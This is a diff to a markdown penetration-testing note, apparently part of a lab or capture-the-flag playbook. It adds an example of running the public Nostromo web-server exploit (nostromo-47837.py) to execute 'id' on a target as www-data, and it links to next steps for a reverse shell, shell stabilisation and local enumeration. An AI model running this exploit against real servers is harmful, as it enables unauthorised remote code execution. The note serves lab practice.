@@ -35,6 +35,15 @@ python2 $BoxDir/exploits/nostromo-47837.py $BoxIP $WebPort \
 
 Then stabilize the shell using [[Linux - Shell Stabilise]].
 
+## Example output
+
+```text
+$ python2 nostromo-47837.py $BoxIP $WebPort "id"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Focus on the harmless identity result before the callback. It proves the target version, request path, command delivery, and execution account all align. Move next to [[Linux - RCE to Shell]] for the listener, then [[Linux - Shell Stabilise]] and [[Linux - Local Enum]].
+
 ## What did you get?
 
 - [ ] `id` returns a service account → **Read the service configuration and route to [[Linux - Local Enum]]**
